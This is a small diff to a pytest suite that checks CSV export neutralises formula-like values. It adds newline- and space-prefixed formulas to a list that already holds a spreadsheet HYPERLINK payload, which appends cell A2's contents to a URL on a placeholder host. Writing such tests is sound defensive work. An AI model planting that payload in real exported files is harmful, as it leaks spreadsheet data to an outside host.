@@ -1117,7 +1117,7 @@ class TestCorrespondenceCsvInjection:
 
     @pytest.mark.parametrize("evil", [
         '=HYPERLINK("http://x/?"&A2,"x")', "+1+1", "-2+3", "@SUM(A1)",
-        "\t=1", "\r=1",
+        "\t=1", "\r=1", "\n=1", "  =1+1",
     ])
     def test_formula_like_values_are_neutralised(self, tmp_path, evil):
         import csv as _csv
